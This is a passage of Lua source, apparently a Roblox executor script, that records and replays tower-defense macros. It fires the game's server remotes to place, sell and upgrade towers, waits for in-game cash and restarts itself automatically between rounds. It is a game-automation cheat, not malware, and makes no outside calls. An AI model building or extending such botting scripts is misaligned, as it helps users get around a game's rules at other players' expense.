                end
            end
        else
            placementCFrame = action.CFrame
        end
        
        if placementCFrame and type(placementCFrame) == "table" and #placementCFrame >= 12 and #allTowers > 1 then
            local success, targetCFrame = pcall(function()
                return CFrame.new(
                    placementCFrame[1], placementCFrame[2], placementCFrame[3],
                    placementCFrame[4], placementCFrame[5], placementCFrame[6],
                    placementCFrame[7], placementCFrame[8], placementCFrame[9],
                    placementCFrame[10], placementCFrame[11], placementCFrame[12]
                )
            end)
            
            if success and targetCFrame then
                local closestTower = nil
                local closestDistance = math.huge
                
                for _, t in ipairs(allTowers) do
                    local hrp = t:FindFirstChild("HumanoidRootPart")
                    if hrp and hrp:IsA("BasePart") then
                        local distance = (hrp.CFrame.Position - targetCFrame.Position).Magnitude
                        if distance < closestDistance then
                            closestDistance = distance
                            closestTower = t
                        end
                    end
                end
                
                if closestTower and closestDistance < 10 then
                    tower = closestTower
                end
            end
        end
        
        if not tower then
            tower = allTowers[1]
        end
        
        if not remote then
            return false, "Sell remote not found"
        end
        
        debugPrint("[Macro] Selling: " .. action.TowerName)
        
        local method = remote:IsA("RemoteFunction") and "InvokeServer" or "FireServer"
        local sellSuccess, sellResult = getgenv()._ConnectionStability_safeRemoteCall(remote, method, tower)
        
        if not sellSuccess then
            return false, "Failed to invoke sell remote: " .. tostring(sellResult)
        end
        
        task.wait(0.3)
        return true, "Sold"
        
    elseif action.ActionType == "Place" then
        local unitNameToPlace = action.Args[1]
        
        if action.TowerName and action.TowerName:match("EZA$") then
            local actualName = getgenv()._GetActualTowerName(action.TowerName)
            if actualName ~= action.TowerName then
                unitNameToPlace = actualName
                print("[Macro] EZA unit detected: " .. action.TowerName .. " → placing as " .. actualName)
            end
        end
        
        local args = {unitNameToPlace}
        if action.Args[2] and type(action.Args[2]) == "table" and #action.Args[2] >= 3 then
            local success, cframe = pcall(function()
                return CFrame.new(unpack(action.Args[2]))
            end)
            if success and cframe then
                args[2] = cframe
            else
                return false, "Invalid position data"
            end
        else
            return false, "Missing position data for placement"
        end
        
        print("[Macro] Placing " .. (action.TowerName or "?") .. " at position")
        
        local actualTowerName = getgenv()._GetActualTowerName(action.TowerName or unitNameToPlace)
        local specificTowerCountBefore = 0
        local towerCountBefore = 0
        
        for _, t in pairs(workspace.Towers:GetChildren()) do
            local owner = t:FindFirstChild("Owner")
            if owner and owner.Value == LocalPlayer then
                towerCountBefore = towerCountBefore + 1
                if t.Name == actualTowerName then
                    specificTowerCountBefore = specificTowerCountBefore + 1
                end
            end
        end
        
        local method = remote:IsA("RemoteFunction") and "InvokeServer" or "FireServer"
        local callSuccess, callResult = getgenv()._ConnectionStability_safeRemoteCall(remote, method, unpack(args))
        
        if not callSuccess then
            return false, "Failed to call placement remote: " .. tostring(callResult)
        end
        
        task.wait(0.8)
        
        local specificTowerCountAfter = 0
        local towerCountAfter = 0
        
        for _, t in pairs(workspace.Towers:GetChildren()) do
            local owner = t:FindFirstChild("Owner")
            if owner and owner.Value == LocalPlayer then
                towerCountAfter = towerCountAfter + 1
                if t.Name == actualTowerName then
                    specificTowerCountAfter = specificTowerCountAfter + 1
                end
            end
        end
        
        if specificTowerCountAfter > specificTowerCountBefore then
            print("[Macro] ✅ Placement successful - " .. actualTowerName .. " (" .. specificTowerCountBefore .. " → " .. specificTowerCountAfter .. ") | Total: " .. towerCountBefore .. " → " .. towerCountAfter)
            return true, "Placed"
        else
            print("[Macro] ❌ Placement failed - " .. actualTowerName .. " count unchanged: " .. specificTowerCountBefore .. " | Total towers: " .. towerCountAfter)
            if specificTowerCountBefore > 0 then
                print("[Macro] ⚠️ Unit already placed, skipping duplicate placement attempt")
                return true, "Already placed"
            end
            if retryCount < 1 then
                warn("[Macro] Retrying placement...")
                task.wait(0.5)
                return executeAction(action, retryCount + 1)
            end
            return false, "Placement failed after retry"
        end
    elseif action.ActionType == "Ability" then
        local success = getgenv().executeAbilityAction(action)
        if success then
            return true, "Ability used"
        else
            return false, "Ability execution failed"
        end
    elseif action.ActionType == "AbilitySelection" then
        local success = getgenv().executeCardSelectionAction(action)
        if success then
            return true, "Card selected"
        else
            return false, "Card selection failed"
        end
    end
    
    return false, "Unknown action type"
end

local function detectMacroProgress(macroData)
    local towerStates = {}
    
    for _, tower in pairs(workspace.Towers:GetChildren()) do
        local owner = tower:FindFirstChild("Owner")
        if owner and owner.Value == LocalPlayer then
            local towerName = tower.Name
            local upgrade = tower:FindFirstChild("Upgrade")
            local level = upgrade and upgrade.Value or 0
            
            if not towerStates[towerName] then
                towerStates[towerName] = {count = 0, maxLevel = 0}
            end
            
            towerStates[towerName].count = towerStates[towerName].count + 1
            towerStates[towerName].maxLevel = math.max(towerStates[towerName].maxLevel, level)
            
            local ezaDisplayName = getgenv()._GetEZADisplayName(towerName)
            if ezaDisplayName ~= towerName then
                if not towerStates[ezaDisplayName] then
                    towerStates[ezaDisplayName] = {count = 0, maxLevel = 0}
                end
                towerStates[ezaDisplayName].count = towerStates[ezaDisplayName].count + 1
                towerStates[ezaDisplayName].maxLevel = math.max(towerStates[ezaDisplayName].maxLevel, level)
            end
        end
    end
    
    local lastCompletedStep = 0
    local expectedTowers = {}
    
    for i, action in ipairs(macroData) do
        if action.ActionType == "Place" then
            local towerName = action.TowerName
            expectedTowers[towerName] = (expectedTowers[towerName] or 0) + 1
            
            if towerStates[towerName] and towerStates[towerName].count >= expectedTowers[towerName] then
                lastCompletedStep = i
            else
                break
            end
            
        elseif action.ActionType == "Upgrade" then
            local towerName = action.TowerName
            
            local expectedLevel = 0
            for j = 1, i do
                if macroData[j].ActionType == "Upgrade" and macroData[j].TowerName == towerName then
                    expectedLevel = expectedLevel + 1
                end
            end
            
            if towerStates[towerName] and towerStates[towerName].maxLevel >= expectedLevel then
                lastCompletedStep = i
            else
                break
            end
        end
    end
    
    
    if lastCompletedStep >= #macroData then
        return -1
    end
    
    return lastCompletedStep + 1
end

local function validateMacro(macroData)
    if not macroData or #macroData == 0 then
        return false, "Macro is empty"
    end
    
    local hasPlacement = false
    for _, action in ipairs(macroData) do
        if not action.ActionType then
            return false, "Action missing ActionType"
        end
        
        if action.ActionType == "Place" then
            hasPlacement = true
            if not action.Args or not action.Args[1] then
                return false, "Place action missing unit name"
            end
        end
        
        if not action.RemoteName then
            return false, "Action missing RemoteName"
        end
    end
    
    if not hasPlacement then
        return false, "Macro has no placement actions"
    end
    
    return true, "Valid"
end

getgenv().shouldExecuteAbility = function(action, currentElapsedTime)
    if action.ActionType ~= "Ability" and action.ActionType ~= "AbilitySelection" then
        return false
    end
    
    local timeDifference = currentElapsedTime - action.Time
    
    if timeDifference >= -0.1 then
        return true
    end
    
    return false
end

local function playMacroV2()
    if getgenv()._checkIfInLobby() then
        if getgenv().DebugMode then
            print("[Macro] Cannot start in lobby")
        end
        return
    end
    
    if getgenv()._MacroWaitingForRestart then
        if getgenv().DebugMode then
            print("[Macro] Waiting for restart")
        end
        return
    end
    
    if getgenv().MacroPlaybackActive then 
        local waitCount = 0
        while getgenv().MacroPlaybackActive and waitCount < 30 do
            task.wait(0.1)
            waitCount = waitCount + 1
        end
        if getgenv().MacroPlaybackActive then
            getgenv().MacroPlaybackActive = false
            task.wait(0.5)
        end
    end
    
    if not getgenv().CurrentMacro then
        warn("[Macro] No macro selected")
        return
    end
    
    if not getgenv().Macros[getgenv().CurrentMacro] then
        warn("[Macro] Macro not found: " .. tostring(getgenv().CurrentMacro))
        return
    end
    
    getgenv().MacroPlaybackActive = true
    
    if not getgenv()._MacroInstanceId then
        getgenv()._MacroInstanceId = 0
    end
    getgenv()._MacroInstanceId = getgenv()._MacroInstanceId + 1
    local currentInstanceId = getgenv()._MacroInstanceId
    
    getgenv().MacroCurrentStep = 0
    getgenv().MacroActionText = ""
    getgenv().MacroUnitText = ""
    getgenv().MacroWaitingText = ""
    
    task.spawn(function()
        if currentInstanceId ~= getgenv()._MacroInstanceId then
            return
        end
        
        local macroData = getgenv().Macros[getgenv().CurrentMacro]
        if not macroData or #macroData == 0 then
            warn("[Macro] Macro data is empty")
            getgenv().MacroPlaybackActive = false
            return
        end
        
        getgenv().MacroPlaybackMacroData = macroData
        getgenv().MacroTotalSteps = #macroData
        
        local valid, err = validateMacro(macroData)
        if not valid then
            getgenv().MacroStatusText = "Invalid Macro"
            getgenv().MacroWaitingText = err
            getgenv().UpdateMacroStatus()
            getgenv().MacroPlaybackActive = false
            return
        end
        
        local step = 1
        local state = getgenv().GameState
        
        local isSeamlessRestart = getgenv()._MacroSeamlessRestart == true
        
        if not getgenv()._MacroProgressDetected then
            getgenv()._MacroProgressDetected = false
        end
        
        if isSeamlessRestart then
            step = 1
            getgenv()._MacroProgressDetected = true
            print("[Macro] Seamless restart - starting from step 1")
            getgenv()._MacroWaitingForRestart = false
        end
        
        if not isSeamlessRestart and state.gameStarted and not getgenv()._MacroWaitingForRestart and not getgenv()._MacroProgressDetected then
            if state.wave == 1 and state.elapsedTime < 30 and not state.gameEnded then
                local detectedStep = detectMacroProgress(macroData)
                
                if detectedStep == -1 then
                    getgenv().MacroStatusText = "Finished"
                    getgenv().MacroWaitingText = "All steps complete"
                    getgenv().MacroCurrentStep = #macroData
                    getgenv().MacroTotalSteps = #macroData
                    getgenv().UpdateMacroStatus()
                    getgenv().MacroPlaybackActive = false
                    return
                end
                
                if detectedStep > 0 and detectedStep <= #macroData then
                    step = detectedStep
                    getgenv().MacroCurrentStep = step
                    getgenv().MacroTotalSteps = #macroData
                    local action = macroData[step]
                    if action then
                        getgenv().MacroActionText = action.ActionType or "Action"
                        getgenv().MacroUnitText = action.TowerName or "?"
                    end
                    print("[Macro] Resuming from step " .. step)
                    getgenv()._MacroProgressDetected = true
                end
            end
        end
        
        if not state.gameStarted then
            local waitStartTime = tick()
            
            print("[Macro] Waiting for game to start...")
            
            while getgenv().MacroPlayEnabled do
                local currentState = getgenv().GameState
                
                if currentState.gameStarted then
                    print("[Macro] Game started - beginning playback")
                    break
                end
                
                getgenv().MacroStatusText = "Waiting for Start"
                getgenv().MacroWaitingText = "Game not started..."
                getgenv().UpdateMacroStatus()
                
                local elapsed = tick() - waitStartTime
                if elapsed > 300 then
                    warn("[Macro] Timeout waiting for game start")
                    getgenv().MacroPlaybackActive = false
                    return
                end
                
                task.wait(0.3)
            end
        else
            print("[Macro] Game already started - beginning playback")
        end
        
        if not getgenv().MacroPlayEnabled then
            getgenv().MacroPlaybackActive = false
            return
        end
        
        task.wait(1.5)
        
        if not getgenv().MacroPlayEnabled then
            getgenv().MacroPlaybackActive = false
            return
        end
        
        local cashInitAttempts = 0
        while cashInitAttempts < 10 do
            local currentCash = tonumber(getgenv().MacroCurrentCash) or 0
            if currentCash > 0 then
                break
            end
            
            pcall(function()
                if LocalPlayer:FindFirstChild("Cash") then
                    getgenv().MacroCurrentCash = LocalPlayer.Cash.Value
                end
            end)
            
            cashInitAttempts = cashInitAttempts + 1
            task.wait(0.5)
        end
        
        getgenv().MacroStatusText = "Playing"
        getgenv().MacroWaitingText = ""
        getgenv().UpdateMacroStatus()
        
        local playbackStartTime = tick()
        local stepFailureCount = {}
        local maxFailuresPerStep = 2
        local lastStepExecuted = 0
        
        
        while getgenv().MacroPlayEnabled and step <= #macroData do
            if currentInstanceId ~= getgenv()._MacroInstanceId then
                break
            end
            
            if getgenv().IsKilled and getgenv().IsKilled() then
                break
            end
            
            if step <= lastStepExecuted then
                step = lastStepExecuted + 1
                if step > #macroData then break end
            end
            
            lastStepExecuted = step
            
            local currentState = getgenv().GameState
            
            if currentState.gameEnded then
                getgenv().MacroStatusText = "Game Ended"
                getgenv().MacroWaitingText = "Waiting for next round..."
                getgenv().UpdateMacroStatus()
                getgenv().MacroPlaybackActive = false
                return
            end
            
            if not currentState.gameStarted then
                getgenv().MacroStatusText = "Restart Detected"
                getgenv().MacroWaitingText = "Waiting for game start..."
                getgenv().UpdateMacroStatus()
                
                local waitStart = tick()
                while not currentState.gameStarted and getgenv().MacroPlayEnabled and (tick() - waitStart) < 30 do
                    task.wait(0.2)
                    currentState = getgenv().GameState
                end
                
                if not getgenv().MacroPlayEnabled then
                    break
                end
                
                if not currentState.gameStarted then
                    task.wait(2)
                    step = 1
                    stepFailureCount = {}
                    playbackStartTime = tick()
                    lastStepExecuted = 0
                    continue
                end
            end
            
            local action = macroData[step]
            if not action then
                step = step + 1
                if step < lastStepExecuted then
                    step = lastStepExecuted + 1
                end
                lastStepExecuted = step
                continue
            end
            
            local failureKey = step .. "_" .. (action.ActionType or "") .. "_" .. (action.TowerName or "")
            if not stepFailureCount[failureKey] then
                stepFailureCount[failureKey] = 0
            end
            
            if stepFailureCount[failureKey] >= maxFailuresPerStep then
                step = step + 1
                if step < lastStepExecuted then
                    step = lastStepExecuted + 1
                end
                lastStepExecuted = step
                continue
            end
            
            local currentElapsedTime = tick() - playbackStartTime
            
            if action.ActionType == "Ability" or action.ActionType == "AbilitySelection" then
                if not getgenv().shouldExecuteAbility(action, currentElapsedTime) then
                    task.wait(0.1)
                    continue
                end
            end
            
            getgenv().MacroCurrentStep = step
            getgenv().MacroTotalSteps = #macroData
            getgenv().MacroActionText = action.ActionType or "Action"
            getgenv().MacroUnitText = action.TowerName or "?"
            
            if action.ActionType == "Ability" or action.ActionType == "AbilitySelection" then
                getgenv().MacroWaitingText = "Using ability..."
            else
                getgenv().MacroWaitingText = ""
            end
            
            getgenv().UpdateMacroStatus()
            
            local cash = tonumber(getgenv().MacroCurrentCash) or 0
            local cost = tonumber(action.Cost) or 0
            local shouldSkipStep = false
            
            if cost > 0 and cash < cost then
                getgenv().MacroStatusText = "Waiting Cash"
                getgenv().MacroWaitingText = "$" .. cost .. " (have $" .. cash .. ")"
                getgenv().UpdateMacroStatus()
                
                local cashWaitStart = tick()
                local maxCashWait = 300
                local lastCash = cash
                local noIncomeTime = 0
                local lastCashUpdateTime = 0
                
                while getgenv().MacroPlayEnabled do
                    task.wait(0.1)
                    cash = tonumber(getgenv().MacroCurrentCash) or 0
                    
                    if cash >= cost then 
                        break 
                    end
                    
                    if cash > lastCash then
                        noIncomeTime = 0
                    else
                        noIncomeTime = noIncomeTime + 0.1
                    end
                    lastCash = cash
                    
                    local waitTime = tick() - cashWaitStart
                    
                    if waitTime > maxCashWait then
                        shouldSkipStep = true
                        break
                    end
                    
                    if noIncomeTime > 60 and waitTime > 30 then
                        shouldSkipStep = true
                        break
                    end
                    
                    if tick() - lastCashUpdateTime > 1 then
                        getgenv().MacroWaitingText = "$" .. cost .. " (have $" .. cash .. ") - " .. math.floor(waitTime) .. "s"
                        getgenv().UpdateMacroStatus()
                        lastCashUpdateTime = tick()
                    end
                end
                
                if not getgenv().MacroPlayEnabled then break end
            end
            
            if shouldSkipStep then
                getgenv().MacroStatusText = "Skipping"
                getgenv().MacroWaitingText = "Not enough cash"
                getgenv().UpdateMacroStatus()
                task.wait(2)
                step = step + 1
                if step < lastStepExecuted then
                    step = lastStepExecuted + 1
                end
                lastStepExecuted = step
                continue
            end
            
            if getgenv().MacroStatusText ~= "Playing" then
                getgenv().MacroStatusText = "Playing"
                getgenv().MacroWaitingText = ""
                getgenv().UpdateMacroStatus()
            end
            
            local actionSuccess = false
            local actionMessage = ""
            
            local success, result, msg = pcall(function()
                return executeAction(action)
            end)
            
            if success and result then
                actionSuccess = true
                actionMessage = msg or "Success"
            else
                actionMessage = msg or "Action failed"
            end
            
            if not actionSuccess then
                stepFailureCount[failureKey] = (stepFailureCount[failureKey] or 0) + 1
                getgenv().MacroStatusText = "Step Failed - Continuing"
                getgenv().MacroWaitingText = actionMessage .. " (" .. stepFailureCount[failureKey] .. "/" .. maxFailuresPerStep .. ")"
                getgenv().UpdateMacroStatus()
                task.wait(1)
            else
                stepFailureCount[failureKey] = 0
                local nextStep = step + 1
                if nextStep <= #macroData then
                    local nextAction = macroData[nextStep]
                    if nextAction then
                        if nextAction.ActionType == "Upgrade" then
                            getgenv().MacroWaitingText = "Next: Upgrade"
                        elseif nextAction.ActionType == "Place" then
                            getgenv().MacroWaitingText = "Next: Place"
                        elseif nextAction.ActionType == "Ability" then
                            getgenv().MacroWaitingText = "Next: Ability"
                        else
                            getgenv().MacroWaitingText = ""
                        end
                        getgenv().UpdateMacroStatus()
                    end
                end
            end
            
            step = step + 1
            
            if step < lastStepExecuted then
                warn("[Macro] Attempted to regress step from " .. lastStepExecuted .. " to " .. step .. ", correcting...")
                step = lastStepExecuted + 1
            end
            
            task.wait(0.5)
            
            local stepDelay = getgenv().MacroStepDelay or 0
            if stepDelay > 0 then
                task.wait(stepDelay)
            else
                task.wait(0.3)
            end
        end
        
        if step > #macroData then
            getgenv().MacroStatusText = "Macro Complete"
            getgenv().MacroWaitingText = "Waiting for seamless restart..."
            getgenv().MacroCurrentStep = #macroData
            getgenv().MacroTotalSteps = #macroData
            getgenv().MacroActionText = "Complete"
            getgenv().MacroUnitText = ""
            getgenv().UpdateMacroStatus()
            
            print("[Macro] ✅ Macro completed all steps")
            
            getgenv().MacroPlaybackActive = false
            getgenv()._MacroProgressDetected = false
            
            if not getgenv().SeamlessFixEnabled then
                getgenv()._MacroWaitingForRestart = true
            end
            
            if not getgenv().SeamlessFixEnabled then
                getgenv()._MacroWaitingForRestart = true
                print("[Macro] Monitoring for seamless restart...")
                local monitorStartTime = tick()
                local lastGameStartedCheck = true
                local lastWaveCheck = 0
                
                pcall(function()
                    local waveValue = RS:FindFirstChild("Wave")
                    if waveValue and waveValue.Value then
                        lastWaveCheck = waveValue.Value
                    end
                end)
                
                while getgenv().MacroPlayEnabled and (tick() - monitorStartTime) < 300 do
                    task.wait(0.1)
                    
                    if not getgenv()._MacroWaitingForRestart then
                        break
                    end
                    
                    local currentGameStarted = true
                    
                    pcall(function()
                        local gs = RS:FindFirstChild("GameStarted")
                        if gs and gs.Value ~= nil then
                            currentGameStarted = gs.Value
                        end
                    end)
                    
                    if lastGameStartedCheck and not currentGameStarted then
                        print("[Macro] 🔄 GameStarted = false detected, checking for new round...")
                        getgenv()._MacroWaitingForRestart = false
                        
                        task.wait(0.5)
                        
                        local checkGameStarted = false
                        pcall(function()
                            local gs = RS:FindFirstChild("GameStarted")
                            if gs and gs.Value ~= nil then
                                checkGameStarted = gs.Value
                            end
                        end)
                        
                    if checkGameStarted then
                        print("[Macro] ✅ GameStarted = true detected immediately, restarting macro now!")
                        getgenv()._MacroSeamlessRestart = true
                        getgenv()._MacroProgressDetected = false
                        getgenv().MacroGameState.gameEnded = false
                        getgenv().MacroGameState.hasEndGameUI = false
                        getgenv().MacroGameState.lastGameEndedState = false
                        task.wait(0.5)
                        playMacroV2()
                        return
                    end
                        
                        break
                    end
                    
                    lastGameStartedCheck = currentGameStarted
                end
                
                if not getgenv()._MacroWaitingForRestart then
                    print("[Macro] ✅ Wait flag cleared, waiting for GameStarted = true to restart...")
                    
                    local waitForTrueStart = tick()
                    local lastCheck = false
                    while getgenv().MacroPlayEnabled and (tick() - waitForTrueStart) < 30 do
                        task.wait(0.1)
                        local gameStarted = false
                        pcall(function()
                            local gs = RS:FindFirstChild("GameStarted")
                            if gs and gs.Value ~= nil then
                                gameStarted = gs.Value
                            end
                        end)
                        
                        if not lastCheck and gameStarted then
                            print("[Macro] ✅ GameStarted = true detected, restarting macro now!")
                            getgenv()._MacroSeamlessRestart = true
                            getgenv()._MacroProgressDetected = false
                            getgenv().MacroGameState.gameEnded = false
                            getgenv().MacroGameState.hasEndGameUI = false
                            getgenv().MacroGameState.lastGameEndedState = false
                            task.wait(0.5)
                            playMacroV2()
                            return
                        end
                        
                        lastCheck = gameStarted
                    end
                    
                    warn("[Macro] ⚠️ Timeout waiting for GameStarted = true after flag cleared")
                end
            end
            
            return
        else
            getgenv().MacroStatusText = "Idle"
            getgenv().MacroCurrentStep = 0
            getgenv().MacroActionText = ""
            getgenv().MacroUnitText = ""
            getgenv().MacroWaitingText = ""
            getgenv().UpdateMacroStatus()
        end
        
        getgenv().MacroPlaybackActive = false
        getgenv().MacroPlaybackMacroData = nil
    end)
end

setupRecordingHook()
monitorEndGameUI()

task.spawn(function()
    local lastWaveValue = 0
    local highestWaveSeen = 0
    local lastSeamlessRestartTick = 0
    local waveResetCooldown = 30
    local waveResetMinProgress = 20
    
    while true do
        task.wait(0.5)
        
        if getgenv().MacroPlayEnabled and getgenv().MacroPlaybackActive then
            pcall(function()
                local waveValue = RS:FindFirstChild("Wave")
                if not waveValue then
                    return
                end
                
                local currentWave = waveValue.Value
                if currentWave <= 0 then
                    return
                end
                
                if currentWave > highestWaveSeen then
                    highestWaveSeen = currentWave
                end
                
                local timeSinceLastRestart = tick() - lastSeamlessRestartTick
                local dropAmount = lastWaveValue - currentWave
                local enoughProgress = highestWaveSeen >= (getgenv().TwoXResetWave or waveResetMinProgress)
                local earlyGame = currentWave <= 2
                local validDrop = lastWaveValue >= 15 and dropAmount >= 10
                local cooldownPassed = timeSinceLastRestart >= waveResetCooldown
                local notAlreadyFlagged = getgenv()._MacroSeamlessRestart ~= true
                
                if enoughProgress and earlyGame and validDrop and cooldownPassed and notAlreadyFlagged then
                    print("[Macro] 🔄 Seamless wave reset (" .. lastWaveValue .. " → " .. currentWave .. ")")
                    
                    getgenv()._MacroSeamlessRestart = true
                    getgenv()._MacroProgressDetected = false
                    getgenv().MacroGameState.gameEnded = false
                    getgenv().MacroGameState.hasEndGameUI = false
                    getgenv().MacroGameState.lastGameEndedState = false
                    lastSeamlessRestartTick = tick()
                    
                    if getgenv().MacroPlaybackActive then
                        getgenv().MacroPlaybackActive = false
                        task.wait(0.5)
                    end
                    
                    playMacroV2()
                    highestWaveSeen = currentWave
                end
                
                lastWaveValue = currentWave
            end)
        else
            lastWaveValue = 0
            highestWaveSeen = 0
        end
    end
end)

task.spawn(function()
    local gameStartedTracker = nil
    local lastGameStartedValue = nil
    
    local function setupGameStartedTracker()
        if gameStartedTracker then
            gameStartedTracker:Disconnect()
            gameStartedTracker = nil
        end
        
        pcall(function()
            local gs = RS:FindFirstChild("GameStarted")
            if gs and gs.Value ~= nil then
                lastGameStartedValue = gs.Value
                
                gameStartedTracker = gs.Changed:Connect(function(newValue)
                    if lastGameStartedValue == true and newValue == false then
                        print("[Macro] 🔄 GameStarted = false detected instantly, preparing restart...")
                        
                        if getgenv().MacroPlayEnabled then
                            task.spawn(function()
                                if getgenv().MacroPlaybackActive then
                                    getgenv().MacroPlaybackActive = false
                                    task.wait(0.5)
                                end
                                
                                getgenv()._MacroWaitingForRestart = false
                                getgenv()._MacroSeamlessRestart = true
                                getgenv()._MacroProgressDetected = false
                                getgenv().MacroGameState.gameEnded = false
                                getgenv().MacroGameState.hasEndGameUI = false
                                getgenv().MacroGameState.lastGameEndedState = false
                                
                                local waitStart = tick()
                                while (tick() - waitStart) < 15 do
                                    task.wait(0.1)
                                    local checkStarted = false
                                    pcall(function()
                                        local gsCheck = RS:FindFirstChild("GameStarted")
                                        if gsCheck and gsCheck.Value ~= nil then
                                            checkStarted = gsCheck.Value
                                        end
                                    end)
                                    
                                    if checkStarted then
                                        print("[Macro] ✅ GameStarted = true detected, restarting macro immediately!")
                                        getgenv().MacroPlaybackActive = false
                                        task.wait(0.3)
                                        playMacroV2()
                                        return
                                    end
                                end
                            end)
                        end
                    end
                    
                    lastGameStartedValue = newValue
                end)
            end
        end)
    end
    
    setupGameStartedTracker()
    
    local reconnectDelay = 0
    while true do
        task.wait(1)
        reconnectDelay = reconnectDelay + 1
        
        if reconnectDelay >= 5 then
            reconnectDelay = 0
            pcall(function()
                local gs = RS:FindFirstChild("GameStarted")
                if not gs then
                    if gameStartedTracker then
                        gameStartedTracker:Disconnect()
                        gameStartedTracker = nil
                    end
                elseif not gameStartedTracker or not gameStartedTracker.Connected then
                    setupGameStartedTracker()
                end
            end)
        end
    end
end)

task.spawn(function()
    local lastRestartAttempt = 0
    local lastEndGameUIState = false
    local restartCooldown = false
    
    while true do
        task.wait(0.3)
        
        local currentEndGameUIState = false
        pcall(function()
            local endGameUI = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
            currentEndGameUIState = endGameUI and endGameUI.Enabled or false
        end)
        
        if lastEndGameUIState and not currentEndGameUIState and getgenv().MacroPlayEnabled and not restartCooldown then
            debugPrint("[Macro] EndGameUI removed, checking if game actually ended...")
            restartCooldown = true
            
            if getgenv()._MacroWaitingForRestart then
                debugPrint("[Macro] Macro is waiting for restart, checking GameStarted = false...")
                local gameStartedCheck = true
                pcall(function()
                    local gs = RS:FindFirstChild("GameStarted")
                    if gs and gs.Value ~= nil then
                        gameStartedCheck = gs.Value
                    end
                end)
                
                if not gameStartedCheck then
                    print("[Macro] ✅ GameStarted = false detected, clearing wait flag and restarting...")
                    getgenv()._MacroWaitingForRestart = false
                    
                    task.wait(0.5)
                    
                    local checkGameStarted = false
                    pcall(function()
                        local gs = RS:FindFirstChild("GameStarted")
                        if gs and gs.Value ~= nil then
                            checkGameStarted = gs.Value
                        end
                    end)
                    
                    if checkGameStarted then
                        print("[Macro] ✅ GameStarted = true detected, restarting macro now!")
                        getgenv()._MacroSeamlessRestart = true
                        getgenv()._MacroProgressDetected = false
                        getgenv().MacroGameState.gameEnded = false
                        getgenv().MacroGameState.hasEndGameUI = false
                        getgenv().MacroGameState.lastGameEndedState = false
                        task.wait(0.5)
                        playMacroV2()
                        restartCooldown = false
                        lastEndGameUIState = currentEndGameUIState
                        task.wait(2)
                        continue
                    end
                else
                    debugPrint("[Macro] Still waiting for GameStarted = false (currently true)")
                    restartCooldown = false
                    lastEndGameUIState = currentEndGameUIState
                    task.wait(2)
                    continue
                end
            end
            
            task.wait(3)
            
            if getgenv().MacroPlaybackActive then
                debugPrint("[Macro] Already playing, skipping restart")
                restartCooldown = false
                lastEndGameUIState = currentEndGameUIState
                task.wait(5)
                continue
            end
            
            local gameEnded = false
            local checkWaitTime = 0
            local maxCheckWait = 10
            
            print("[Macro] Verifying game has ended (waiting for GameStarted = false)...")
            while checkWaitTime < maxCheckWait do
                local currentGameStarted = true
                pcall(function()
                    local gameStartedValue = RS:FindFirstChild("GameStarted")
                    if gameStartedValue and gameStartedValue.Value ~= nil then
                        currentGameStarted = gameStartedValue.Value
                    end
                end)
                
                if not currentGameStarted then
                    gameEnded = true
                    print("[Macro] ✅ Game ended confirmed (GameStarted = false)")
                    break
                end
                
                print("[Macro] Game still active (GameStarted = true), waiting for game to end...")
                task.wait(0.5)
                checkWaitTime = checkWaitTime + 0.5
            end
            
            if not gameEnded then
                warn("[Macro] ⚠️ Game never ended (GameStarted never became false), aborting restart")
                restartCooldown = false
                lastEndGameUIState = currentEndGameUIState
                task.wait(5)
                continue
            end
            
            print("[Macro] Waiting for new game to start (waiting for GameStarted = true)...")
            local maxWait = 20
            local waited = 0
            local gameReady = false
            
            while waited < maxWait do
                local towerCount = 0
                pcall(function()
                    for _, tower in pairs(workspace.Towers:GetChildren()) do
                        local owner = tower:FindFirstChild("Owner")
                        if owner and owner.Value == LocalPlayer then
                            towerCount = towerCount + 1
                        end
                    end
                end)
                
                local wave = 0
                local gameStarted = false
                local state = -1
                pcall(function()
                    local waveValue = RS:FindFirstChild("Wave")
                    if waveValue then
                        wave = waveValue.Value
                    end
                    
                    local gameStartedValue = RS:FindFirstChild("GameStarted")
                    if gameStartedValue and gameStartedValue.Value ~= nil then
                        gameStarted = gameStartedValue.Value
                    end
                    
                    local stateValue = RS:FindFirstChild("State")
                    if stateValue then
                        state = stateValue.Value
                    end
                end)
                
                if gameStarted then
                    gameReady = true
                    print("[Macro] ✅ New game started - GameStarted = true, starting playback (Wave: " .. wave .. ", State: " .. state .. ")")
                    break
                end
                
                print(string.format("[Macro] Waiting for new game... State: %d, Wave: %d, Towers: %d, GameStarted: %s", state, wave, towerCount, tostring(gameStarted)))
                
                task.wait(0.5)
                waited = waited + 0.5
            end
            
            if not gameReady then
                warn("[Macro] ⚠️ Timeout waiting for new game to start (GameStarted never became true), aborting restart")
                restartCooldown = false
                lastEndGameUIState = currentEndGameUIState
                task.wait(5)
                continue
            end
            
            getgenv().MacroPlaybackActive = false
            getgenv().MacroStatusText = "Idle"
            getgenv().MacroCurrentStep = 0
            getgenv().MacroActionText = ""
            getgenv().MacroUnitText = ""
            getgenv().MacroWaitingText = ""
            getgenv()._MacroSeamlessRestart = true
            getgenv()._MacroWaitingForRestart = false
            getgenv()._MacroProgressDetected = true
            
            getgenv().MacroGameState.gameEnded = false
            getgenv().MacroGameState.hasEndGameUI = false
            getgenv().MacroGameState.lastGameEndedState = false
            
            getgenv().UpdateMacroStatus()
            
            local waitCount = 0
            while getgenv().MacroPlaybackActive and waitCount < 20 do
                task.wait(0.1)
                waitCount = waitCount + 1
            end
            
            if getgenv().MacroPlaybackActive then
                warn("[Macro] Force stopping macro playback before restart")
                getgenv().MacroPlaybackActive = false
                task.wait(1)
            end
            
            task.wait(2)
            
            debugPrint("[Macro] Starting playback...")
            playMacroV2()
            lastRestartAttempt = tick()
            
            task.wait(2)
            getgenv()._MacroSeamlessRestart = false
            getgenv()._MacroWaitingForRestart = false
            getgenv()._MacroProgressDetected = false
            
            task.delay(5, function()
                restartCooldown = false
            end)
        end
        
        lastEndGameUIState = currentEndGameUIState
        
        if getgenv().MacroPlayEnabled and not getgenv().MacroPlaybackActive and not restartCooldown and not getgenv()._MacroWaitingForRestart then
            local now = tick()
            if now - lastRestartAttempt > 3 then
                local shouldRestart = false
                local restartReason = ""
                
                local currentWave = 0
                local currentElapsedTime = 0
                local gameEnded = false
                pcall(function()
                    local wave = RS:FindFirstChild("Wave")
                    if wave and wave.Value then
                        currentWave = wave.Value
                    end
                    local elapsed = RS:FindFirstChild("ElapsedTime")
                    if elapsed and elapsed.Value then
                        currentElapsedTime = elapsed.Value
                    end
